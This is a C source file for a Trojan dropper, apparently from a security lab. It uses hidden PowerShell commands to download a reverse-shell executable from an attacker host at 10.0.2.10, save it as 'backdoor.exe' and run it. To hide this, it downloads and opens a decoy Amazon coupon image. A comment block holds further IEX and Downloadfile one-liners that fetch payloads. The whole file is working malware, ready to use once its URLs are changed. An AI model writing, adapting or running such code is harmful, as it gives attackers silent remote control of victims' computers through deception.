#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
system("powershell.exe \"IEX( (new-object net.webclient).downloadstring
('http://10.0.2.10/payload.txt'))\"");
system("powershell.exe -w hidden -c (new-object System.Net.WebClient).
Downloadfile('http://10.0.2.10/payload.txt', 'C:\\Users\\Public\\screenshot.exe') ");
system("powershell.exe start C:\\Users\\Public\\backdoor.exe"); 
system("powershell.exe start C:\\Users\\Public\\coupon.jpg"); 
*/

void powershellDownloadCmd(char * url, char * shellCMD, char * outputLoc);
void powershellcmdRun(char * shellCMDRun, char * outputLoc);
char* insert_char_realloc (char *str, int len);

int main()
{


//You need to make changes here
char url_evil[200]="http://10.0.2.10/rev_https_8080.exe";
char url_image[200]="http://10.0.2.10/amazon-coupon-code.jpg";
//char url_evil[200]="https://pbs.twimg.com/profile_images/1057899591708753921/PSpUS-Hp_400x400.jpg"; //for test
//char url_image[200]="https://pbs.twimg.com/profile_images/54789364/JPG-logo-highres_400x400.jpg"; //for testing
char backdoorLoc[200]="C:\\Users\\Public\\backdoor.exe";
char outputLoc_image[200]="C:\\Users\\Public\\coupon.jpg";



// ==================download backdoor
char shellCMD[400]="";
powershellDownloadCmd(url_evil, shellCMD, backdoorLoc);
//printf("URL: %s\n", shellCMD);
system(shellCMD);

//================== download image
char shellCMD_image[400]="";
powershellDownloadCmd(url_image, shellCMD_image, outputLoc_image);
//printf("URL: %s\n", shellCMD_image);
system(shellCMD_image);

//=============execute backdoor
char shellCMDRun[400]="";
powershellcmdRun(shellCMDRun,  insert_char_realloc (backdoorLoc, strlen(backdoorLoc)));
//printf("command: %s\n", shellCMDRun);
system(shellCMDRun);

//=============open an image
char shellCMDRun_image[400]="";
powershellcmdRun(shellCMDRun_image,  insert_char_realloc (outputLoc_image, strlen(outputLoc_image)));
//printf("command: %s\n", shellCMDRun_image);
system(shellCMDRun_image);

return 0;
}

/* function returning a powershell command */
void powershellDownloadCmd(char * url, char * shellCMD, char * outputLoc){
  char url_with_quote[200]="";
  strcat(url_with_quote,"'");
  strcat(url_with_quote,url);
  strcat(url_with_quote,"'");

  char loc_with_quote[200]="";
  strcat(loc_with_quote,",\'");
  strcat(loc_with_quote,outputLoc);
  strcat(loc_with_quote,"\')");


  char shellCMD_head[400]="powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile(";
  strcat(shellCMD,shellCMD_head);
  strcat(shellCMD,url_with_quote);
  strcat(shellCMD,loc_with_quote);
}


void powershellcmdRun(char * shellCMDRun, char * outputLoc){
  char shellCMD_head[400]="\"powershell.exe start ";
  strcat(shellCMDRun,shellCMD_head);
  strcat(shellCMDRun,outputLoc);
  strcat(shellCMDRun,"\"");
}

char* insert_char_realloc (char *str, int len){
int i;
int j=0;
char * str_temp = (char *)malloc(len + 10);
for (i=0;i<len;i++){
  str_temp[j] = str[i];
  if(str[i]=='\\'){
     j++;	  
     str_temp[j] = '\\';
  }
  j++;
}
return str_temp;
}


